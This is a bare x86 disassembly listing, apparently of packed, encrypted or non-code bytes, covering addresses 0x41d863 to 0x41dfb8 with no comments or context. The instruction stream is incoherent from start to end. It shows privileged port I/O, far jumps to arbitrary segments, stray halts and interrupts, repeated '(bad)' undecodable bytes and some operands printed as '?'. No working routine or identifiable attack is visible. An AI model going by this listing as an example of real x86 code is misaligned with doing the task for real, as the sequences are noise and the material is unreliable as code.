  41d863:	push   esi
  41d864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d865:	je     0x41d8c2
  41d867:	dec    edx
  41d868:	xchg   edx,eax
  41d869:	jae    0x41d7ee
  41d86b:	and    eax,0x58ea4841
  41d870:	sub    bh,cl
  41d872:	stos   BYTE PTR es:[edi],al
  41d873:	pop    esi
  41d874:	mov    dh,0xdf
  41d876:	pop    ebp
  41d877:	imul   DWORD PTR [ebp-0x7b2fded4]
  41d87d:	stos   BYTE PTR es:[edi],al
  41d87e:	push   esp
  41d87f:	mov    edi,0xe4adaa5a
  41d884:	sbb    ch,BYTE PTR [edx]
  41d886:	add    BYTE PTR [ecx+0x78a43ecb],bl
  41d88c:	test   al,0x8c
  41d88e:	inc    edx
  41d88f:	ficom  DWORD PTR [edi+eiz*8-0x45]
  41d893:	mov    ah,0x1d
  41d895:	and    ebx,DWORD PTR [ebx]
  41d897:	shr    BYTE PTR [ecx],1
  41d899:	sti    
  41d89a:	xchg   DWORD PTR [eax+0x6032dc44],edx
  41d8a0:	push   esi
  41d8a1:	cld    
  41d8a2:	fmul   QWORD PTR [edi+0x15]
  41d8a5:	stc    
  41d8a6:	xchg   ebx,eax
  41d8a7:	inc    ecx
  41d8a8:	lock imul eax,DWORD PTR es:[eax-0x20],0x63614b1f
  41d8b1:	ror    BYTE PTR [edx+0xc185fff],cl
  41d8b7:	push   cs
  41d8b8:	mov    al,0xce
  41d8ba:	pop    ebx
  41d8bb:	cmp    ebp,DWORD PTR [edx+0x75047997]
  41d8c1:	rcl    DWORD PTR [ebx-0x5cc37248],0xbd
  41d8c8:	mov    ds:0x2cb2588a,eax
  41d8cd:	dec    ebx
  41d8ce:	pop    esi
  41d8cf:	cmp    edx,DWORD PTR ds:0xd83d8b76
  41d8d5:	pop    ds
  41d8d6:	pushf  
  41d8d7:	or     ah,BYTE PTR [ebx-0x6c687c7c]
  41d8dd:	stos   DWORD PTR es:[edi],eax
  41d8de:	dec    esp
  41d8df:	xor    eax,0x3bafbb85
  41d8e4:	mov    esi,0x60c41c87
  41d8e9:	sub    eax,0xc54b879f
  41d8ee:	adc    DWORD PTR [eax],eax
  41d8f0:	pop    ss
  41d8f1:	cld    
  41d8f2:	test   cl,dh
  41d8f4:	xchg   edx,eax
  41d8f5:	loopne 0x41d8fa
  41d8f7:	gs hlt 
  41d8f9:	popa   
  41d8fa:	pop    DWORD PTR [ecx+0x1055110b]
  41d900:	xchg   ebp,eax
  41d901:	push   eax
  41d902:	sti    
  41d903:	lods   al,BYTE PTR ds:[esi]
  41d904:	sub    eax,0x88f975b9
  41d909:	inc    esp
  41d90a:	icebp  
  41d90b:	fld    TBYTE PTR [ecx-0x2c]
  41d90e:	std    
  41d90f:	pusha  
  41d910:	cmp    al,0x9c
  41d912:	xchg   ebx,eax
  41d914:	sbb    DWORD PTR [esp+esi*8],esp
  41d917:	fistp  QWORD PTR [edx]
  41d919:	add    al,0x42
  41d91b:	cmp    edx,ecx
  41d91d:	icebp  
  41d91e:	jg     0x41d94f
  41d920:	and    BYTE PTR [edi+edi*8-0x19],bl
  41d924:	aad    0xbc
  41d926:	cdq    
  41d927:	retf   0xd3e2
  41d92a:	ins    BYTE PTR es:[edi],dx
  41d92b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d92c:	jae    0x41d9a1
  41d92e:	add    ch,ah
  41d930:	ret    0xfd16
  41d933:	add    al,0x2b
  41d935:	xchg   BYTE PTR [edx],bh
  41d937:	adc    al,0x92
  41d939:	xchg   BYTE PTR [edi+esi*4+0x9],bh
  41d93d:	into   
  41d93e:	inc    edx
  41d93f:	mov    esp,0x449d04a9
  41d944:	bound  ebp,QWORD PTR [ebx+eax*4+0x6b]
  41d948:	mov    DWORD PTR [edx-0x15],eax
  41d94b:	scas   al,BYTE PTR es:[edi]
  41d94c:	push   eax
  41d94d:	mov    bl,0x70
  41d94f:	mov    ?,WORD PTR [esi+eiz*1+0x13]
  41d953:	fisttp WORD PTR [esi]
  41d955:	inc    eax
  41d956:	scas   al,BYTE PTR es:[edi]
  41d957:	lds    ebx,FWORD PTR [esi+edi*2]
  41d95a:	push   ds
  41d95b:	push   ebp
  41d95c:	minps  xmm2,XMMWORD PTR [esi-0x633e0bbf]
  41d963:	xchg   cl,cl
  41d965:	cli    
  41d966:	xor    DWORD PTR [esi+edx*8+0x26655fd3],eax
  41d96d:	in     eax,dx
  41d96e:	sub    al,0xf6
  41d970:	adc    dl,bh
  41d972:	or     al,0xea
  41d974:	mov    ss,WORD PTR [edx-0x168c137f]
  41d97a:	repz leave 
  41d97c:	retf   0x9996
  41d97f:	test   eax,0x44b1ded8
  41d984:	imul   edi,DWORD PTR [eax],0xfffffff7
  41d987:	das    
  41d988:	lods   al,BYTE PTR ds:[esi]
  41d989:	ins    DWORD PTR es:[edi],dx
  41d98a:	cs inc edx
  41d98c:	cld    
  41d98d:	aas    
  41d98e:	add    al,dh
  41d990:	jo     0x41d99a
  41d992:	hlt    
  41d993:	mov    cl,ah
  41d995:	cmp    al,0x35
  41d997:	arpl   WORD PTR [esi-0x10],di
  41d99a:	jl     0x41d968
  41d99c:	lea    eax,[esi+0x62c7ba9c]
  41d9a2:	cmc    
  41d9a3:	mov    bh,0x64
  41d9a5:	mov    ebx,?
  41d9a7:	dec    esi
  41d9a8:	push   ebp
  41d9a9:	cmp    DWORD PTR [edi-0x26e3a0d0],0x11a7c030
  41d9b3:	push   ds
  41d9b4:	rol    DWORD PTR [eax-0x12],0xfa
  41d9b8:	mov    ch,0xde
  41d9ba:	add    ecx,DWORD PTR [ebx]
  41d9bc:	add    BYTE PTR [eax+0x5f],0x6d
  41d9c0:	popa   
  41d9c1:	ret    0x11e3
  41d9c4:	pop    es
  41d9c5:	stos   DWORD PTR es:[edi],eax
  41d9c6:	in     al,0xc0
  41d9c8:	pop    esi
  41d9c9:	fsubr  QWORD PTR ds:0x50c5db72
  41d9cf:	xor    cl,BYTE PTR [edi-0x37]
  41d9d2:	sub    eax,0x59a5af08
  41d9d7:	inc    ebx
  41d9d8:	dec    esi
  41d9d9:	sahf   
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	test   al,0xf2
  41d9dd:	fidivr WORD PTR [edx-0x289d2a43]
  41d9e3:	dec    edi
  41d9e4:	fs pop edx
  41d9e6:	fwait
  41d9e7:	pop    ds
  41d9e8:	ins    BYTE PTR es:[edi],dx
  41d9e9:	mov    ds:0xa35fc94d,al
  41d9ee:	mov    edx,0xd76bbdf3
  41d9f3:	aas    
  41d9f4:	pop    ecx
  41d9f5:	ds int 0xa4
  41d9f8:	or     ebx,DWORD PTR [ebp+0x65]
  41d9fb:	mov    cl,0x6
  41d9fd:	(bad)  
  41d9fe:	cmp    BYTE PTR [edx-0x4a],dl
  41da01:	cli    
  41da02:	leave  
  41da03:	sar    BYTE PTR [edx],1
  41da05:	paddq  mm2,QWORD PTR [esi-0x10f15b8f]
  41da0c:	lods   al,BYTE PTR ds:[esi]
  41da0d:	xchg   DWORD PTR [edi],esi
  41da0f:	mov    DWORD PTR [ebx],eax
  41da11:	dec    edx
  41da12:	mov    eax,0xe8aaf21f
  41da17:	sbb    DWORD PTR [ebx-0x3a6fc345],0x66
  41da1e:	xchg   ebx,eax
  41da1f:	pop    esp
  41da20:	add    dh,ah
  41da22:	hlt    
  41da23:	dec    eax
  41da24:	loope  0x41da23
  41da26:	clc    
  41da27:	retf   0x6dbe
  41da2a:	adc    dh,BYTE PTR [edi+0x55]
  41da2d:	or     edi,DWORD PTR [edx-0x464e80d9]
  41da33:	sub    al,0xb6
  41da35:	mov    dl,0xfb
  41da37:	rcr    BYTE PTR [ebx-0xa],0xc8
  41da3b:	add    al,0x30
  41da3d:	mov    ds:0x6ec70d40,al
  41da42:	icebp  
  41da43:	sbb    DWORD PTR ds:0xd82a9383,edi
  41da49:	add    BYTE PTR [ecx-0xa],ah
  41da4c:	jbe    0x41da2d
  41da4e:	imul   esp,DWORD PTR [edx],0x1651eef1
  41da54:	cmc    
  41da55:	and    eax,0xb9ba7d75
  41da5a:	sub    dh,BYTE PTR [ebp-0x20897361]
  41da60:	cmp    dl,BYTE PTR [eax-0x6d]
  41da63:	inc    esi
  41da64:	push   ecx
  41da65:	cmp    BYTE PTR [esi-0x24233d88],bh
  41da6b:	inc    ecx
  41da6c:	mov    eax,0x5efb5e5b
  41da71:	xor    BYTE PTR [edx-0x6c],dl
  41da74:	iret   
  41da75:	mov    ebp,0xf7eb1a88
  41da7a:	sbb    DWORD PTR [esi],esp
  41da7c:	sbb    eax,0x509e6c39
  41da81:	lock shl DWORD PTR [edi-0x56],1
  41da85:	mov    WORD PTR [ebx+esi*8],ss
  41da88:	xchg   ebx,eax
  41da8a:	dec    edi
  41da8b:	clc    
  41da8c:	stos   BYTE PTR es:[edi],al
  41da8d:	out    0x3f,eax
  41da8f:	mov    eax,esp
  41da91:	loop   0x41da19
  41da93:	jno    0x41da81
  41da95:	inc    esp
  41da96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da97:	pop    es
  41da98:	jp     0x41da37
  41da9a:	jne    0x41daed
  41da9c:	pop    esp
  41da9d:	nop
  41da9e:	enter  0xdd36,0x5a
  41daa2:	jmp    0xd1a0b4fc
  41daa7:	push   eax
  41daa8:	xor    ebx,DWORD PTR [esi+0x323c8b02]
  41daae:	test   eax,0xf7769ffb
  41dab3:	lods   eax,DWORD PTR ds:[esi]
  41dab4:	fcomp  QWORD PTR [edx+0x4c1880a3]
  41daba:	dec    ecx
  41dabb:	in     al,dx
  41dabc:	sub    al,0x5f
  41dabe:	not    BYTE PTR [ebx]
  41dac0:	in     eax,dx
  41dac1:	lds    esp,FWORD PTR [eax+0x12]
  41dac4:	jns    0x41da96
  41dac6:	shl    DWORD PTR [ebp-0x2b7a78d],1
  41dacc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dacd:	push   ecx
  41dace:	jo     0x41da66
  41dad0:	shl    ecx,cl
  41dad2:	fldenv [ecx+ebx*1]
  41dad5:	cmp    eax,DWORD PTR [edi-0x59a73cb8]
  41dadb:	adc    BYTE PTR [eax-0x30],0x0
  41dadf:	outs   dx,BYTE PTR ds:[esi]
  41dae0:	or     ah,ah
  41dae2:	or     ebp,ebx
  41dae4:	mov    dh,BYTE PTR [eax+0x61]
  41dae7:	push   0x5d
  41dae9:	push   ecx
  41daea:	or     esp,DWORD PTR [ebp-0x61]
  41daed:	aam    0x19
  41daef:	in     al,0x98
  41daf1:	jl     0x41da98
  41daf3:	add    dl,BYTE PTR [esp+edi*8+0x35eb7859]
  41dafa:	push   edx
  41dafb:	dec    esi
  41dafc:	(bad)  
  41dafe:	in     al,dx
  41daff:	sub    DWORD PTR ds:0xa386a8d8,edi
  41db05:	outs   dx,DWORD PTR ds:[esi]
  41db06:	xchg   edi,eax
  41db07:	scas   al,BYTE PTR es:[edi]
  41db08:	mov    ah,0x4c
  41db0a:	sub    eax,edx
  41db0c:	jae    0x41db79
  41db0e:	std    
  41db0f:	jecxz  0x41dac0
  41db11:	lods   al,BYTE PTR ds:[esi]
  41db12:	pop    edi
  41db13:	lods   eax,DWORD PTR ds:[esi]
  41db14:	je     0x41db74
  41db16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db17:	cmp    al,0xf6
  41db19:	lods   al,BYTE PTR ds:[esi]
  41db1a:	pop    esi
  41db1b:	pop    edi
  41db1c:	ss pop esp
  41db1e:	mov    ah,0x68
  41db20:	lock pop ebx
  41db22:	or     BYTE PTR ss:[ebx+edi*1],ch
  41db26:	fistp  DWORD PTR [esi-0x27]
  41db29:	mov    edi,DWORD PTR [esp+esi*8]
  41db2c:	outs   dx,DWORD PTR ds:[esi]
  41db2d:	and    al,0x73
  41db2f:	push   ebp
  41db30:	shl    DWORD PTR [ebp-0x70eebbe8],1
  41db36:	xchg   esi,eax
  41db37:	xchg   edx,eax
  41db38:	ss pop ss
  41db3a:	push   cs
  41db3b:	push   es
  41db3c:	mov    edi,0xa416ac8a
  41db41:	mov    BYTE PTR ds:0x78e57139,bl
  41db47:	imul   ecx,DWORD PTR [edx+0x7c],0x1e
  41db4b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db4d:	add    esi,DWORD PTR [ebp+0x5e]
  41db50:	int3   
  41db51:	xchg   BYTE PTR [ebp-0x7a],bl
  41db54:	iret   
  41db55:	loopne 0x41db05
  41db57:	jno    0x41db19
  41db59:	ins    BYTE PTR es:[edi],dx
  41db5a:	ja     0x41db4a
  41db5c:	sbb    edi,0x16
  41db5f:	rcr    BYTE PTR [ebp+0x2f35deec],cl
  41db65:	shl    DWORD PTR [edi],cl
  41db67:	stos   DWORD PTR es:[edi],eax
  41db68:	call   0x5be2:0x335e2c76
  41db6f:	sbb    DWORD PTR [ecx+0x72],0x79dc9464
  41db76:	div    esp
  41db78:	mov    DWORD PTR [ecx-0x4a4c3c8f],ebx
  41db7e:	xor    esi,esp
  41db80:	mov    ebp,0xc602f6fd
  41db85:	std    
  41db86:	jne    0x41db21
  41db88:	rol    DWORD PTR [edi-0x56],0xc9
  41db8c:	xchg   ebx,eax
  41db8d:	fistp  WORD PTR [eax+0x7ab23943]
  41db93:	cmp    ecx,DWORD PTR [edi+edx*8-0x2d9a610f]
  41db9a:	ss xor al,0xc5
  41db9d:	cmp    al,0x38
  41db9f:	das    
  41dba0:	retf   
  41dba1:	xor    ecx,DWORD PTR [esi+0x57]
  41dba4:	and    al,0xc4
  41dba6:	icebp  
  41dba7:	sti    
  41dba8:	and    eax,DWORD PTR [esi]
  41dbaa:	repz fsubr QWORD PTR gs:[ecx-0x4f]
  41dbaf:	jle    0x41dba6
  41dbb1:	pop    esi
  41dbb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbb3:	mov    ds:0xae33785d,al
  41dbb8:	aam    0xcf
  41dbba:	inc    esp
  41dbbb:	xor    al,0x4e
  41dbbd:	jo     0x41dc1b
  41dbbf:	mov    edi,0xad943d7
  41dbc4:	cmp    DWORD PTR [ecx+0x681c1c44],0x7f
  41dbcb:	das    
  41dbcc:	sub    al,BYTE PTR [edx+esi*1]
  41dbcf:	adc    eax,0x83017bac
  41dbd4:	mov    edx,DWORD PTR ds:0xffbe03c1
  41dbda:	jmp    0x41dbef
  41dbdc:	fnstcw WORD PTR [ebx+0x75]
  41dbdf:	in     eax,dx
  41dbe0:	sti    
  41dbe1:	out    dx,eax
  41dbe2:	jg     0x41dc0b
  41dbe4:	mov    BYTE PTR [edx+0x16],bh
  41dbe7:	mov    cl,0x47
  41dbe9:	ret    
  41dbea:	and    ch,BYTE PTR ss:[edi]
  41dbed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbee:	mov    eax,ds:0x3e9d247b
  41dbf3:	adc    eax,0x565c02e5
  41dbf8:	xor    ah,bh
  41dbfa:	mov    ah,BYTE PTR [esi-0x2c6d32a9]
  41dc00:	(bad)  
  41dc01:	leave  
  41dc02:	jg     0x41dc37
  41dc04:	not    BYTE PTR [eax+0x7d]
  41dc07:	jle    0x41dbae
  41dc09:	aas    
  41dc0a:	fnstenv ds:0xac7f52cb
  41dc10:	retf   0x3215
  41dc13:	jl     0x41dc53
  41dc15:	retf   
  41dc16:	push   esp
  41dc17:	sub    ebx,DWORD PTR [ebx+0x2ca02c49]
  41dc1d:	enter  0x860d,0xfa
  41dc21:	fadd   DWORD PTR [ebx-0x5eebbb4c]
  41dc27:	stos   BYTE PTR es:[edi],al
  41dc28:	inc    ebp
  41dc29:	stos   BYTE PTR es:[edi],al
  41dc2a:	pop    es
  41dc2b:	cmp    DWORD PTR [ebx],0x650d39ed
  41dc31:	shl    DWORD PTR [esp+edi*1+0x5f],0x5b
  41dc36:	loope  0x41dc0e
  41dc38:	addr16 mov dh,0x51
  41dc3b:	ret    
  41dc3c:	ins    DWORD PTR es:[edi],dx
  41dc3d:	jnp    0x41dc25
  41dc3f:	push   ebp
  41dc40:	rcl    BYTE PTR [edi],1
  41dc42:	dec    ecx
  41dc43:	mov    ds:0x4519e85f,al
  41dc48:	adc    BYTE PTR [edx],dl
  41dc4a:	pop    edx
  41dc4b:	ins    DWORD PTR es:[edi],dx
  41dc4c:	mov    al,0xf0
  41dc4e:	add    esp,DWORD PTR [esp+ecx*1+0x3ee41a77]
  41dc55:	xchg   edx,eax
  41dc56:	cs xchg si,ax
  41dc59:	mov    al,ds:0xaac1b38e
  41dc5e:	sub    BYTE PTR [eax-0x292e2df0],dl
  41dc64:	cmp    eax,0xb4d9feab
  41dc69:	xchg   edi,eax
  41dc6a:	scas   eax,DWORD PTR es:[edi]
  41dc6b:	add    eax,0xb9000e23
  41dc70:	sub    al,0xd4
  41dc72:	inc    esp
  41dc73:	jle    0x41dbf8
  41dc75:	inc    edi
  41dc76:	mov    al,0x41
  41dc78:	jbe    0x41dcf8
  41dc7a:	cmc    
  41dc7b:	dec    ebp
  41dc7c:	adc    ebp,DWORD PTR [edx+0x7622a095]
  41dc82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc83:	add    bl,al
  41dc85:	and    BYTE PTR [ebp-0x78cef993],0x9c
  41dc8c:	mov    ebx,0x631d0b6f
  41dc91:	sbb    eax,DWORD PTR [ebp+0x43]
  41dc94:	mov    al,0xdd
  41dc96:	stc    
  41dc97:	out    dx,eax
  41dc98:	ins    BYTE PTR es:[edi],dx
  41dc99:	xor    eax,0xfeaba962
  41dc9e:	fistp  QWORD PTR [esi-0xb]
  41dca1:	dec    esp
  41dca2:	push   ss
  41dca3:	mov    bh,BYTE PTR [edx+edi*1-0x7ac4eeef]
  41dcaa:	jns    0x41dca5
  41dcac:	imul   ecx,DWORD PTR [edx+edx*8-0x5898d21b],0xdc6c1438
  41dcb7:	sbb    DWORD PTR [eax+0x6d322635],esp
  41dcbd:	outs   dx,DWORD PTR ds:[esi]
  41dcbe:	mov    dl,0xa5
  41dcc0:	pop    edi
  41dcc1:	pop    esi
  41dcc2:	gs enter 0x1786,0xd9
  41dcc7:	ds jnp 0x41dd48
  41dcca:	xor    eax,0x10da9848
  41dccf:	or     dl,BYTE PTR ds:0x93070ee
  41dcd5:	inc    esp
  41dcd6:	and    al,0x3c
  41dcd8:	xor    al,0x3
  41dcda:	lods   al,BYTE PTR ds:[esi]
  41dcdb:	dec    eax
  41dcdc:	jmp    0x9560faa7
  41dce1:	and    BYTE PTR [ebp+eiz*4+0x27],al
  41dce5:	out    0xa,eax
  41dce7:	fadd   DWORD PTR [esi]
  41dce9:	into   
  41dcea:	pushf  
  41dceb:	es pop ebp
  41dced:	imul   edx,DWORD PTR [esi-0x27542e19],0xffffff9a
  41dcf4:	fnstsw WORD PTR [edi+eiz*2+0x591cb703]
  41dcfb:	push   es
  41dcfc:	inc    ebx
  41dcfd:	mov    DWORD PTR [eax-0x37a9ca0a],ebp
  41dd03:	add    al,0xb3
  41dd05:	lahf   
  41dd06:	lock push eax
  41dd08:	ins    DWORD PTR es:[edi],dx
  41dd09:	(bad)  
  41dd0a:	aas    
  41dd0b:	(bad)  
  41dd0c:	ja     0x41dd23
  41dd0e:	ds add al,0xd1
  41dd11:	clc    
  41dd12:	(bad)  
  41dd13:	pop    edx
  41dd14:	js     0x41dd88
  41dd16:	pop    es
  41dd17:	rcl    DWORD PTR [esi+0x2185a38f],0x34
  41dd1e:	jbe    0x41dd08
  41dd20:	das    
  41dd21:	push   cs
  41dd22:	shl    BYTE PTR [ebx-0x133f238f],1
  41dd28:	jne    0x41dd43
  41dd2a:	(bad)  
  41dd2b:	lods   al,BYTE PTR ds:[esi]
  41dd2c:	add    edi,eax
  41dd2e:	xor    DWORD PTR [edi-0x56],esi
  41dd31:	dec    ebx
  41dd32:	xchg   ah,al
  41dd34:	mov    dl,0x7
  41dd36:	(bad)  
  41dd37:	loop   0x41dd22
  41dd39:	cdq    
  41dd3a:	pop    ds
  41dd3b:	dec    edx
  41dd3c:	adc    DWORD PTR [edi+ecx*4],edi
  41dd3f:	shl    DWORD PTR [ebp+ebp*4+0x45],cl
  41dd43:	ret    0x929f
  41dd46:	dec    ecx
  41dd47:	int    0xa4
  41dd49:	les    edi,FWORD PTR [ebp-0x35]
  41dd4c:	out    dx,al
  41dd4d:	sahf   
  41dd4e:	mov    ds:0x460ec080,eax
  41dd53:	fidiv  DWORD PTR [esi-0x4f]
  41dd56:	ret    
  41dd57:	dec    eax
  41dd58:	cld    
  41dd59:	xchg   BYTE PTR [edi+0x51b05250],bh
  41dd5f:	pop    ecx
  41dd60:	loop   0x41ddb6
  41dd62:	mov    ds:0xb0351c43,al
  41dd67:	jnp    0x41dd79
  41dd69:	call   0xcf0163a
  41dd6e:	dec    ebx
  41dd6f:	repz iret 
  41dd71:	mov    ebx,0xfc820899
  41dd76:	dec    eax
  41dd77:	and    al,0xb2
  41dd79:	adc    ebx,esi
  41dd7b:	cmp    ch,BYTE PTR [edi-0x80]
  41dd7e:	xchg   eax,edi
  41dd80:	ss dec esi
  41dd82:	sbb    dl,al
  41dd84:	xor    eax,0x84db6cb6
  41dd89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd8a:	mov    eax,ds:0x714f8219
  41dd8f:	popf   
  41dd90:	dec    ebp
  41dd91:	cld    
  41dd92:	mov    ch,0x38
  41dd94:	leave  
  41dd95:	fs ret 0xc79a
  41dd99:	sub    dh,dl
  41dd9b:	sbb    edx,DWORD PTR [ebx-0x34]
  41dd9e:	cmc    
  41dd9f:	xchg   ebp,eax
  41dda0:	aas    
  41dda1:	inc    edx
  41dda2:	enter  0x70ea,0x23
  41dda6:	(bad)  
  41dda7:	imul   eax,DWORD PTR [esi+0x41],0xffffff86
  41ddab:	into   
  41ddac:	and    DWORD PTR [ebx],esi
  41ddae:	add    ah,BYTE PTR [edi+0xc]
  41ddb1:	stos   BYTE PTR es:[edi],al
  41ddb2:	ja     0x41dd4b
  41ddb4:	in     al,0x57
  41ddb6:	push   cs
  41ddb7:	pop    edi
  41ddb8:	jmp    0xcc80:0xa6f14544
  41ddbf:	cmc    
  41ddc0:	xchg   ah,dh
  41ddc2:	xchg   edx,eax
  41ddc3:	sub    BYTE PTR [esi-0x2e460c64],al
  41ddc9:	arpl   WORD PTR [ecx+eax*2-0x2def5a7f],si
  41ddd0:	call   0x7a845859
  41ddd5:	add    eax,0x56344669
  41ddda:	jle    0x41de4a
  41dddc:	pushw  0xe3d5
  41dde0:	pop    esi
  41dde1:	push   ds
  41dde2:	or     BYTE PTR [ebp+0x5071e6b9],0x5
  41dde9:	and    al,0x9d
  41ddeb:	enter  0xfbc9,0x72
  41ddef:	test   BYTE PTR [ebp-0x4d],ah
  41ddf2:	das    
  41ddf3:	(bad)  
  41ddf5:	sbb    ebp,ecx
  41ddf7:	sbb    esp,DWORD PTR [edx+0x69]
  41ddfa:	mov    ds:0x68ea0b99,eax
  41ddff:	pop    ebp
  41de00:	xor    dl,BYTE PTR [esi-0x25]
  41de03:	lds    esp,FWORD PTR [ebp+0x32]
  41de06:	cdq    
  41de07:	repz cmp BYTE PTR [ecx+0x1fe7510a],al
  41de0e:	adc    dl,ah
  41de10:	iret   
  41de11:	outs   dx,BYTE PTR ds:[esi]
  41de12:	mov    ebp,ds
  41de14:	ja     0x41de39
  41de16:	test   eax,0xab7ebc8e
  41de1b:	push   es
  41de1c:	sub    BYTE PTR [ebx+ebp*8],al
  41de1f:	daa    
  41de20:	data16 adc ah,BYTE PTR [ebp+0x770f32f2]
  41de27:	cld    
  41de28:	xchg   ebx,eax
  41de29:	dec    esp
  41de2a:	inc    esi
  41de2b:	int3   
  41de2c:	push   0x48
  41de2e:	adc    ch,BYTE PTR [edi+esi*1]
  41de31:	push   ds
  41de32:	shr    DWORD PTR [ecx+0x2dcdbea7],1
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	(bad)  
  41de3a:	div    DWORD PTR [ecx]
  41de3c:	pop    ebx
  41de3d:	adc    eax,DWORD PTR [edi-0x14]
  41de40:	in     al,0xa8
  41de42:	or     ebx,DWORD PTR [ebx+0x7871d4dc]
  41de48:	inc    esp
  41de49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de4a:	icebp  
  41de4b:	sbb    DWORD PTR [ebp-0x5],ecx
  41de4e:	movzx  edi,sp
  41de51:	jns    0x41dde1
  41de53:	nop
  41de54:	sti    
  41de55:	dec    BYTE PTR [ecx]
  41de57:	pop    ss
  41de58:	mov    ah,0x3f
  41de5a:	or     al,0xfc
  41de5c:	xchg   edx,eax
  41de5d:	jecxz  0x41de27
  41de5f:	outs   dx,BYTE PTR ds:[esi]
  41de60:	adc    al,0x52
  41de62:	out    dx,eax
  41de63:	xchg   ecx,eax
  41de64:	mov    edi,0xfae0524
  41de69:	push   esi
  41de6a:	mov    eax,0xb51d6eb4
  41de6f:	(bad)  
  41de70:	fdiv   QWORD PTR [ecx]
  41de72:	sar    DWORD PTR [esi+eiz*2-0x6e1013da],0x7f
  41de7a:	dec    BYTE PTR [edi+0x79]
  41de7d:	arpl   WORD PTR [eax+0x9],ax
  41de80:	lods   al,BYTE PTR ds:[esi]
  41de81:	pop    ebp
  41de82:	outs   dx,BYTE PTR ds:[esi]
  41de83:	in     eax,0xd9
  41de85:	stos   BYTE PTR es:[edi],al
  41de86:	rcr    BYTE PTR [edx+esi*2+0x4bb25549],0x17
  41de8e:	addr16 or eax,0x20397e24
  41de94:	lea    esp,[esi]
  41de96:	push   0x9dbfda98
  41de9b:	or     edx,DWORD PTR [edx]
  41de9d:	(bad)  
  41de9e:	pop    ebx
  41de9f:	mov    ebx,0xf02e3b2
  41dea4:	int3   
  41dea5:	mov    esi,0x6a0e9c63
  41deaa:	fldenv [ebp-0x1a]
  41dead:	in     eax,0x84
  41deaf:	inc    ecx
  41deb0:	xor    ch,ch
  41deb2:	ror    DWORD PTR [eax],cl
  41deb4:	test   al,0xb9
  41deb6:	adc    al,0x98
  41deb8:	adc    BYTE PTR [eax+0x3263f574],ah
  41debe:	mov    BYTE PTR [esi+ecx*4],ch
  41dec1:	pop    edi
  41dec2:	int    0x8c
  41dec4:	jb     0x41dee5
  41dec6:	push   ecx
  41dec7:	pop    ebx
  41dec8:	pop    ebx
  41dec9:	pop    ecx
  41deca:	imul   edx,DWORD PTR [ebx+0x6],0xdd0db613
  41ded1:	sub    BYTE PTR [ebx],al
  41ded3:	inc    eax
  41ded4:	add    BYTE PTR [eax+ebx*4],dh
  41ded7:	or     DWORD PTR [ecx+0x2f],edx
  41deda:	lods   eax,DWORD PTR ds:[esi]
  41dedb:	test   al,0x2
  41dedd:	cmp    esp,DWORD PTR [ebx+eiz*4-0x54]
  41dee1:	jmp    0x782f4542
  41dee6:	xchg   DWORD PTR [esi+0x4bf030f2],esi
  41deec:	dec    eax
  41deed:	in     eax,0x4c
  41deef:	aam    0x93
  41def1:	js     0x41df05
  41def3:	jno    0x41def6
  41def5:	jnp    0x41dee4
  41def7:	call   0x9341:0x9d0102eb
  41defe:	fcom   QWORD PTR [ecx+0x7e]
  41df01:	jns    0x41df64
  41df03:	out    dx,eax
  41df04:	or     dh,ah
  41df06:	popf   
  41df07:	add    ah,dl
  41df09:	ret    
  41df0a:	out    0xea,eax
  41df0c:	mov    eax,0x502f9b78
  41df11:	not    DWORD PTR cs:0x7400d959
  41df18:	cmp    DWORD PTR [ebx],edx
  41df1a:	scas   al,BYTE PTR es:[edi]
  41df1b:	mov    ds:0x2b76bd85,al
  41df20:	mov    bh,BYTE PTR [esi+eiz*8-0x7f]
  41df24:	in     al,0x5a
  41df26:	mov    ds:0x33dffda,al
  41df2b:	xchg   BYTE PTR [edi+eiz*4],dl
  41df2e:	fnstsw WORD PTR [ecx+0x5d7c5a4c]
  41df34:	sbb    ebp,DWORD PTR ds:0x70a3af9b
  41df3a:	mov    dh,0x3b
  41df3c:	inc    esi
  41df3d:	arpl   WORD PTR [edi+0x41],di
  41df40:	adc    esp,DWORD PTR [eax+0x3fe7a6d4]
  41df46:	xchg   ecx,eax
  41df47:	push   ecx
  41df48:	mov    dl,0x61
  41df4a:	shl    BYTE PTR [esi],1
  41df4c:	outs   dx,DWORD PTR ds:[si]
  41df4e:	mov    dl,0x4a
  41df50:	bound  edi,QWORD PTR [ebx-0xff73336]
  41df56:	rol    edi,cl
  41df58:	jmp    0x1e4b6c30
  41df5d:	add    DWORD PTR [eax-0x534e9e32],0xdc34899f
  41df67:	fst    st(6)
  41df69:	mov    ah,0x6b
  41df6b:	mov    al,ds:0x1999a47
  41df70:	push   0xa1ff2563
  41df75:	ficom  DWORD PTR [edx+0x574c6482]
  41df7b:	cmp    ecx,0x9e18b0cc
  41df81:	(bad)  
  41df82:	(bad)  [esi+ebp*4+0x73414ca0]
  41df89:	sub    BYTE PTR [edi+0x70],bl
  41df8c:	sbb    DWORD PTR [ebp-0x63833319],0xffffff80
  41df93:	xchg   esp,eax
  41df94:	stos   DWORD PTR es:[edi],eax
  41df95:	and    eax,DWORD PTR [ecx-0x76c9c99c]
  41df9b:	xchg   esp,eax
  41df9c:	outs   dx,DWORD PTR ds:[esi]
  41df9d:	add    eax,0x343dbf4b
  41dfa2:	mov    ss:0xa59510c3,al
  41dfa8:	mov    dl,0x8b
  41dfaa:	popf   
  41dfab:	retf   
  41dfac:	and    DWORD PTR [edi],ecx
  41dfae:	push   esp
  41dfaf:	sbb    eax,0xf85625c8
  41dfb4:	lods   eax,DWORD PTR ds:[esi]
  41dfb5:	or     al,0xe
  41dfb7:	outs   dx,BYTE PTR ds:[esi]
  41dfb8:	sub    BYTE PTR [eax-0x52bbc202],ch
